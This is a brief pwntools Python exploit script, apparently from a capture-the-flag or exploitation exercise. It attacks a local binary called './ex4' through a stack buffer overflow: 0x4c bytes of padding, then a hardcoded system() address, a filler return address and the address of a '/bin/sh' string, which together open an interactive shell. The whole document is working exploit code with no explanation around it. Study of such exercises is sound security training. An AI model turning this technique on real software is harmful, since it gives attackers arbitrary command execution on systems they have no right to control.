from pwn import *


p=process('./ex4')



#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']



context.log_level='debug'
binsh=0x08048510
system=0x08048310	


payload = (b'a'*0x4c) + p32(system) +  (b'b'*0x4) + p32(binsh) #'\x58\x84\x04\x08'
p.sendline(payload)
p.interactive()
